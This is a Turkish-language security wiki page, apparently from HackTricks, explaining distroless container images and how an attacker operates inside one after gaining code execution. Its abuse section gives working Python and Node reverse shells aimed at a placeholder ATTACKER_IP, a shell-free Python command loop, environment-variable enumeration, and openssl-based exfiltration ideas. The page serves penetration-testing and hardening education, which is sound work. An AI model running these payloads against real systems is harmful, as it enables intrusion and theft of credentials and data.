# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## Genel Bakış

**distroless** container image, tek bir uygulamayı çalıştırmak için gereken **minimum runtime bileşenlerini** içeren ve package manager'lar, shell'ler ve geniş generic userland utility setleri gibi olağan dağıtım araçlarını kasıtlı olarak kaldıran bir image'dır. Pratikte distroless image'lar genellikle yalnızca application binary'sini veya runtime'ını, shared library'lerini, certificate bundle'larını ve çok küçük bir filesystem düzenini içerir.

Buradaki amaç distroless'in yeni bir kernel isolation primitive olması değildir. Distroless bir **image design strategy**'dir. Container filesystem'inin **içinde** bulunanları değiştirir; kernel'in container'ı nasıl izole ettiğini değiştirmez. Bu ayrım önemlidir, çünkü distroless ortamı esas olarak code execution elde ettikten sonra bir attacker'ın kullanabileceği şeyleri azaltarak harden eder. Namespaces, seccomp, capabilities, AppArmor, SELinux veya başka bir runtime isolation mechanism'in yerini tutmaz.

## Distroless Neden Var

Distroless image'lar öncelikle şunları azaltmak için kullanılır:

- image boyutu
- image'ın operational complexity'si
- vulnerability içerebilecek package ve binary sayısı
- varsayılan olarak bir attacker'ın kullanabileceği post-exploitation tool sayısı

Distroless image'ların production application deployment'larında popüler olmasının nedeni budur. Shell, package manager ve neredeyse hiç generic tooling içermeyen bir container, genellikle operational açıdan daha kolay anlaşılır ve compromise sonrasında interactive olarak kötüye kullanılması daha zordur.

Bilinen distroless-style image family'lerine örnekler:

- Google's distroless image'ları
- Chainguard hardened/minimal image'ları

## Distroless Ne Anlama Gelmez

Bir distroless container:

- otomatik olarak rootless değildir
- otomatik olarak non-privileged değildir
- otomatik olarak read-only değildir
- otomatik olarak seccomp, AppArmor veya SELinux tarafından korunmaz
- otomatik olarak container escape'e karşı güvenli değildir

Bir distroless image'ı `--privileged`, host namespace sharing, dangerous bind mount'lar veya mounted runtime socket ile çalıştırmak hâlâ mümkündür. Bu senaryoda image minimal olabilir, ancak container yine de catastrophically insecure olabilir. Distroless, **userland attack surface'i** değiştirir; **kernel trust boundary'yi** değil.

## Typical Operational Characteristics

Bir distroless container'ı compromise ettiğinizde genellikle ilk fark edeceğiniz şey, yaygın varsayımların artık geçerli olmamasıdır. `sh`, `bash`, `ls`, `id`, `cat` olmayabilir; hatta bazen alışılmış tradecraft'ınızın beklediği şekilde çalışan libc-based bir environment bile bulunmayabilir. Tooling eksikliği debugging, incident response ve post-exploitation süreçlerini farklılaştırdığı için bu durum hem offense hem de defense'u etkiler.

En yaygın pattern'ler şunlardır:

- application runtime mevcuttur, ancak başka çok az şey vardır
- shell bulunmadığı için shell-based payload'lar başarısız olur
- helper binary'leri bulunmadığından yaygın enumeration one-liner'ları başarısız olur
- read-only rootfs veya writable tmpfs konumlarında `noexec` gibi file system protection'ları da sıklıkla mevcuttur

İnsanların genellikle "weaponizing distroless" hakkında konuşmasına yol açan kombinasyon budur.

## Distroless And Post-Exploitation

Distroless environment'taki ana offensive challenge her zaman initial RCE değildir. Çoğu zaman asıl mesele sonrasında ne olduğudur. Exploit edilen workload Python, Node.js, Java veya Go gibi bir language runtime içinde code execution sağlıyorsa arbitrary logic çalıştırabilirsiniz; ancak bunu diğer Linux target'larında yaygın olan normal shell-centric workflow'lar üzerinden yapamayabilirsiniz.

Bu, post-exploitation'ın çoğunlukla üç yönden birine kayması anlamına gelir:

1. **Mevcut language runtime'ını doğrudan kullanarak** environment'ı enumerate etmek, socket açmak, file okumak veya ek payload'ları stage etmek.
2. Filesystem read-only ise veya writable location'lar `noexec` olarak mount edilmişse **kendi tooling'inizi memory'ye getirmek**.
3. Application veya dependency'leri beklenmedik şekilde kullanışlı bir şey içeriyorsa **image'da zaten bulunan binary'leri abuse etmek**.

## Abuse

### Zaten Sahip Olduğunuz Runtime'ı Enumerate Edin

Birçok distroless container'da shell yoktur, ancak hâlâ bir application runtime bulunur. Target bir Python service ise Python oradadır. Target Node.js ise Node oradadır. Bu genellikle `/bin/sh` çağırmadan file'ları enumerate etmek, environment variable'larını okumak, reverse shell açmak ve in-memory execution stage etmek için yeterli functionality sağlar.

Python ile basit bir örnek:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Node.js ile basit bir örnek:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Etki:

- environment variables'ın kurtarılması; bunlar çoğunlukla credentials veya service endpoints içerir
- `/bin/ls` olmadan filesystem enumeration
- writable paths ve mounted secrets'ın tespit edilmesi

### `/bin/sh` Olmadan Reverse Shell

Image `sh` veya `bash` içermiyorsa klasik shell tabanlı Reverse Shell hemen başarısız olabilir. Bu durumda, bunun yerine yüklü language runtime'ını kullanın.

Python Reverse Shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
`/bin/sh` mevcut değilse son satırı doğrudan Python ile komut yürütme veya bir Python REPL döngüsüyle değiştirin.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Yine, `/bin/sh` mevcut değilse shell başlatmak yerine Node'un filesystem, process ve networking API'lerini doğrudan kullanın.

### Tam Örnek: No-Shell Python Command Loop

Image'da Python varsa ancak hiç shell yoksa, basit bir etkileşimli loop genellikle full post-exploitation capability'yi korumak için yeterlidir:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Bu, etkileşimli bir shell binary'si gerektirmez. Saldırganın bakış açısından etkisi temel bir shell ile pratikte aynıdır: mevcut runtime üzerinden command execution, enumeration ve ek payload'ların staging'i.

### Bellek İçi Tool Çalıştırma

Distroless image'lar genellikle şunlarla birlikte kullanılır:

- `readOnlyRootFilesystem: true`
- `/dev/shm` gibi yazılabilir ancak `noexec` tmpfs
- package management tool'larının bulunmaması

Bu kombinasyon, klasik "binary'yi diske indir ve çalıştır" iş akışlarını güvenilmez hâle getirir. Bu durumlarda memory execution teknikleri temel çözüm hâline gelir.

Bunun için özel sayfa:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Buradaki en ilgili teknikler şunlardır:

- scripting runtime'ları üzerinden `memfd_create` + `execve`
- DDexec / EverythingExec
- memexec
- memdlopen

### Image İçinde Zaten Bulunan Binary'ler

Bazı distroless image'lar, compromise sonrasında kullanışlı hâle gelen ve operasyonel olarak gerekli binary'leri hâlâ içerir. Sık gözlemlenen bir örnek `openssl`'dir; çünkü uygulamalar bazen crypto veya TLS ile ilgili görevler için buna ihtiyaç duyar.

Hızlı bir arama pattern'i şöyledir:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
`openssl` mevcutsa şu amaçlarla kullanılabilir:

- outbound TLS bağlantıları
- izin verilen bir egress kanalı üzerinden veri exfiltration
- encoded/encrypted blob'lar aracılığıyla payload verilerinin staging edilmesi

Kesin abuse, gerçekten nelerin kurulu olduğuna bağlıdır; ancak genel fikir şudur: distroless, "hiç araç yok" anlamına gelmez; "normal bir distribution image'a kıyasla çok daha az araç" anlamına gelir.

## Kontroller

Bu kontrollerin amacı, image'ın pratikte gerçekten distroless olup olmadığını ve post-exploitation için hangi runtime veya helper binary'lerinin hâlâ kullanılabilir olduğunu belirlemektir.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Burada ilginç olanlar:

- Shell mevcut değilse ancak Python veya Node gibi bir runtime varsa, post-exploitation runtime-driven execution yaklaşımına yönelmelidir.
- Root filesystem read-only ve `/dev/shm` writable ancak `noexec` ise memory execution techniques çok daha önemli hâle gelir.
- `openssl`, `busybox` veya `java` gibi helper binaries mevcutsa, daha ileri erişimi başlatmak için yeterli işlevsellik sunabilirler.

## Runtime Defaults

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Google distroless style images | Tasarım gereği minimal userland | Shell yoktur, package manager yoktur; yalnızca application/runtime dependencies bulunur | debugging layers, sidecar shells, busybox veya tooling eklemek |
| Chainguard minimal images | Tasarım gereği minimal userland | Azaltılmış package surface; çoğunlukla tek bir runtime veya service üzerine odaklanır | `:latest-dev` veya debug varyantlarını kullanmak, build sırasında tools kopyalamak |
| Kubernetes workloads using distroless images | Pod config'e bağlıdır | Distroless yalnızca userland'ı etkiler; Pod security posture yine Pod spec'e ve runtime defaults'a bağlıdır | ephemeral debug containers, host mounts, privileged Pod settings eklemek |
| Docker / Podman running distroless images | run flags'e bağlıdır | Minimal filesystem, ancak runtime security hâlâ flags ve daemon configuration'a bağlıdır | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |

Temel nokta, distroless'ın bir **image property** olması, runtime protection olmamasıdır. Değeri, compromise sonrasında filesystem içinde kullanılabilir olanları azaltmasından gelir.

## Related Pages

Distroless environments içinde genellikle ihtiyaç duyulan filesystem ve memory-execution bypass'ları için:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Distroless workloads için de geçerli olan container runtime, socket ve mount abuse yöntemleri için:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
